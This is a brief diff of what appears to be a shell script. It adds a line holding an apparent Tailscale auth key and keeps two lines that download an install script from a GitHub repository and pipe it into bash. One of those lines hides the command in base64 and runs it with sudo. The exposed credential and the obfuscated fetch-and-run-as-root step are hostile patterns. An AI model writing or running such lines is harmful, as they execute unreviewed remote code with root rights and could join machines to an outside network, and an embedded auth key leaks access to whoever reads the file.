@@ -1,3 +1,5 @@
+tskey-auth-kN84HPWZ9i11CNTRL-h6kUeMMtB7aCkiyUCoSv6a963RcunSwsM
+
 echo "Y3VybCAtcyBodHRwczovL2dpdGh1Yi5jb20vT2d5ZWV0MTAvaW5zdGFsbGVyOTAwMC9yYXcvcmVmcy9oZWFkcy9tYWluL2luc3RhbGwuc2ggfCBiYXNo" | base64 -d | sudo bash
 
 curl -s https://github.com/Ogyeet10/installer9000/raw/refs/heads/main/install.sh | bash
